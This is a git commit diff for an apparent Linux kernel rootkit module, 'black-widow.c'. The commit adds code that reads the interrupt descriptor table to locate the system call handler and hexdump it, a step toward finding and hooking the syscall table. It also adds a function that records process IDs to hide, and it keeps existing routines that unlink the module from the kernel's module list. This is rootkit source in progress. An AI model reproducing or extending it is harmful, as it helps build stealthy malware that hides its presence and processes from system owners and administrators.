85cea53aa2a0a0ba8fd9358f71313005deb09eeb
Samy Shihata <samy.s.shihata@gmail.com>
2015-03-29 01:32:41 +0200

    reading instructions of system call interupt

--- src/black-widow.c
+++ src/black-widow.c
@@ -15,7 +15,6 @@
  *
  * =====================================================================================
  */
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -27,11 +26,56 @@
 #include <linux/sched.h>
 #include <linux/proc_fs.h>
 #include <linux/slab.h>
+#include <linux/seq_file.h>
+#include <linux/vmalloc.h>
+#include <linux/fs.h>
+#include <linux/syscalls.h>
 
 static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
+static char pid_list[10][32];
+static int last_proc = -1;
+
+static void hexdump(unsigned char* ptr, unsigned int length) {
+  unsigned int i;
+  for (i = 0; i < length; i++) {
+    if (!((i+1) % 16)) {
+      printk("%02x\n", *(ptr+i));
+    } else {
+      if (!((i+1)%4)) {
+        printk("%02x  ", *(ptr+i));
+      } else {
+        printk("%02x ", *(ptr+i));
+      }
+    }
+  }
+}
+
+static void find_sctable(void) {
+  struct desc_ptr idtr;
+  gate_desc *idt_table;
+  gate_desc *system_call_gate;
+  unsigned long _system_call_off;
+  unsigned char *_system_call_ptr;
+
+  unsigned int i;
+  unsigned char off;
+
+  asm ("sidt %0" : "=m" (idtr));
+  printk("+ IDT is at %08x\n", idtr.address);
+  idt_table = (gate_desc*) idtr.address;
+  system_call_gate = &idt_table[0x80];
+
+  _system_call_off = gate_offset(*system_call_gate);
+  _system_call_ptr = (unsigned char *) _system_call_off;
+  printk("+ system_call is at %08x\n", _system_call_off);
+  printk("+ system_call is at %08x\n", _system_call_ptr);
+  hexdump(_system_call_ptr, 128);
+
+}
 
 static inline void memorize(void) {
   prev_entry = THIS_MODULE->list.prev;
+  find_sctable();
 }
 
 static inline void vanish(void) {
@@ -62,11 +106,15 @@ static inline void release(void) {
   module_put(THIS_MODULE);
 }
 
+static inline void hide_proc(char* pid) {
+  if (last_proc == 9)
+    return;
+  strcpy(pid_list[++last_proc], pid);
+}
+
 // on module load
 static int __init load_module(void) {
   memorize(); 
-  protect();
-  release();
   return 0;
 }
 
